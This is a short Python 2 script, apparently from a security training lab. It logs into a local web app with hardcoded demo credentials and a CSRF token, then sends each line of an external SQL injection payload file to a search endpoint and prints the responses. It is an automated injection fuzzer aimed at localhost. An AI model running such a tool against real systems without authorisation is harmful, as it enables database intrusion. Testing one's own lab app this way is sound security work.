import requests
from BeautifulSoup import BeautifulSoup
def sql_injection():
    sql_session = requests.Session()
    login_url = "http://127.0.0.1:8000/login/"
    login_page = sql_session.get(login_url)
    csrf_token = sql_session.cookies['java_csrf']
    print csrf_token
    login_data = dict(email_id = "betty_ross@we45.com", password = "secdevops",csrfmiddlewaretoken = csrf_token)
    print login_data
    login_requests = sql_session.post(login_url, data = login_data,headers = dict(Referer = login_url))
    print login_requests
    post_login_token = sql_session.cookies['java_csrf']
    test_url = "http://127.0.0.1:8000/tests/"
    with open('SQL_payload.txt') as f:
        for payload in f.readlines():
            sqli_request = sql_session.post(test_url, data = dict(search = payload.rstrip(), csrfmiddlewaretoken=post_login_token), headers=dict(Referer=test_url))
            bs = BeautifulSoup(sqli_request.text)
            print bs
sql_injection()

